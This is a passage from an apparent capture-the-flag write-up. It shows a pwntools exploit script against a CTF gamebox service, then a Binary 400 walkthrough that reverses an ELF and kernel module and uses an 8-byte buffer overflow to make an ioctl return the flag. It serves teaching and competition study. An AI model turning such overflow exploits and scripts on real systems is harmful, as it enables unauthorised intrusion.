<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">3</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Insert pre-auth key</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">preauthkey</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Invalid index</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> list_secret</span><span style="color:#666666">():</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">></span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">4</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">List of secrets:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Done list of secrets</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> leak</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> change_codes</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">code1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> code2</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> access</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> preauthkey </span><span style="color:#CB7676">=</span><span style="color:#4D9375"> None</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> secret </span><span style="color:#CB7676">=</span><span style="color:#4D9375"> None</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> password </span><span style="color:#CB7676">=</span><span style="color:#4D9375"> None</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">></span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">5</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Do you want to call 'Show secret' function also</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">access</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> access </span><span style="color:#CB7676">==</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">n</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">        c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Insert pre-auth key</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">        c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">322376503</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Insert code 1</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">code1</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Insert code 2</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">code2</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> access </span><span style="color:#CB7676">==</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">y</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> preauthkey </span><span style="color:#CB7676">==</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">13371337</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">            assert</span><span style="color:#DBD7CAEE"> secret </span><span style="color:#CB7676">is</span><span style="color:#CB7676"> not</span><span style="color:#4D9375"> None</span></span>
<span class="line"><span style="color:#DBD7CAEE">        c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">></span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">        c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">3</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">        c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Insert pre-auth key</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">        c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#B8A965">str</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">preauthkey</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">())</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> preauthkey </span><span style="color:#CB7676">==</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">13371337</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">            c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Insert secret (0 &#x3C; index &#x3C; 4)</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">            c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#B8A965">str</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">secret</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">())</span></span>
<span class="line"><span style="color:#DBD7CAEE">        c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Insert password</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">        c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">password</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">        leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Done</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> leak</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> change_codes_final</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">code1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> code2</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> password</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">></span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">5</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Do you want to call 'Show secret' function also</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">y</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Insert code 1</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">code1</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Insert code 2</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">code2</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Insert password</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">password</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Done</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> leak</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> show_code</span><span style="color:#666666">():</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">></span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">7</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> leak</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">c </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">gamebox3.reply.it</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 3527</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">ae86b59869f0806b5f53b_be20c200469a9a0ebfdbbe4__</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">change_codes</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">7020098272914927464</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#666666">(</span><span style="color:#4C9A91">31</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#666666">),</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">500237086311</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#666666">(</span><span style="color:#4C9A91">31</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#666666">),</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">n</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">show_secret</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">0</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">not_important</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> change_codes_final</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 31</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">B</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 28</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x04\x00\x00</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Wild BackD00r appeared!</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">leak</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#666666">()</span></span>
<span class="line"></span></code></pre>
<h3 id="binary-400">Binary 400</h3>
<p>This challenge provides a 64-bit ELF, a kernel module, and a bash script to start a qemu instance. The bash script also contains some comments with a link to a Ubuntu ISO and the kernel version to use. No qcow2 image was given.</p>
<p>We spent a bit to <strong>set up the right environment</strong>. In detail, we:</p>
<ul>
<li>downloaded the linked Ubuntu ISO image;</li>
<li>run qemu with the bash script adding the <code>-s</code> option to allow an easy gdb attach;</li>
<li>created the user <code>user</code> as required by the challenge binaries;</li>
<li>inserted and loaded the kernel module and granted the right permission to the created device;</li>
<li>started pwnme (it spawns a socket to which we can connect to interact with the actual challenge).</li>
</ul>
<p>We reversed both the ELF and the kernel module using ghidra and IDA.</p>
<p>At the very beginning, the challenge asks to verify our identity. If a random answer is provided, the challenge does not allow to go further.
Analyzing the function that verifies the identity, it is easy to see how our input is compared with a hardcoded string.
![]({{ site.baseurl }}/writeup_files/reply2022/images/cCCSrAk.png)
Taking into account the endianness, the right identity is hence <code>_g3nn4r0_f3r10p3z_</code>.
Now, we have four different actions that the challenge allows to perform:</p>
<ol>
<li>discover dimensions: prints some portal ids;</li>
<li>dimension info: prints some information associated with a specific dimension. One of this information is called flg (is it the flag slot?). It requires to first select the dimension using the option 3;</li>
<li>select dimension: allows to select a specific dimension. If the provided dimension id is lower than 1, it is put equal to one;</li>
<li>write message: allows us to write something and prints a message from the portal. This portal message is randomly chosen from a set of hardcoded strings. It requires to first select the dimension using the option 3;</li>
</ol>
<p>To easily interact with the challenge, we wrote some primitives in python using the pwntools like the following ones.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> check_identity</span><span style="color:#666666">():</span></span>
<span class="line"><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">#> </span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">_g3nn4r0_f3r10p3z_</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> discover_dimensions</span><span style="color:#666666">():</span></span>
<span class="line"><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">[>] yOUR cHOICE:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> leak</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> get_dimension_info</span><span style="color:#666666">():</span></span>
<span class="line"><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">[>] yOUR cHOICE:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">2</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    selected </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#DBD7CAEE">    leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> selected</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> leak</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> select_dimension</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">dimension</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">[>] yOUR cHOICE:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">3</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">yOUR sELECTION: </span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">dimension</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> send_message</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">[>] yOUR cHOICE:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">4</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">wRITE yOUR mESSAGE:</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">mESSAGE fROM tHE dIMENSION</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> leak</span></span>
<span class="line"></span></code></pre>
<p>Reading the decompiled code, we noticed a <strong>8-bytes overflow</strong> in the send message option. In brief, the code reads 0x400 bytes in a 0x3f8 long buffer. In this way, we can overwrite some information like the id and some other values that we did not know how to use at this point.
Now we should understand better how the module works. The get dimension info function (that should print the flag) calls the greentooth_ioctl, so we first focused our attention on how the passed parameters are used by it.
We analyzed the code behaviour both statically and dynamically.
The first two dimensions (id1 and id2) are different w.r.t. the other ones and contain some info that are set to zero for the other ids. Indeed, in the kernel module code, there is some hard coded data. More interesting, the id 1 dimension data contains the string <code>{FLG:7h15_15_7h3_f14g}</code> in the position where there should be the flg info.
Now we know where the flag is but we need to understand why it is not printed when we call the print dimension info  option with id 1.
We reversed the <code>simple_a2mp_getinfo_req</code> function of the kernel module and noticed how the information retrieved was different according to the sign of a specific parameter. If this parameter is positive, <code>simple_a2mp_produce_getinfo_rsp</code> is called and the flag is not returned. The parameter value depends on the arguments passed to ioctl by pwnme. It is not directly controlled by the user but is stored in memory in the byte after the dimension id, in the range of the overflow described above. Actually, the first overflowed byte is the id and the second one is the <code>simple_a2mp_produce_getinfo_rsp</code> activation parameter.
Hence, the final attack pipeline is the following one:</p>
<ol>
<li>select the dimension to access to all the options (send message and get dimension info);</li>
<li>send a message that overflows the parameters passed to ioctl. The id byte is overflowed with 1 (the dimension with the flag), while the following one with 0x80 (-1);</li>
<li>call the get dimension info option.</li>
</ol>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">select_dimension</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
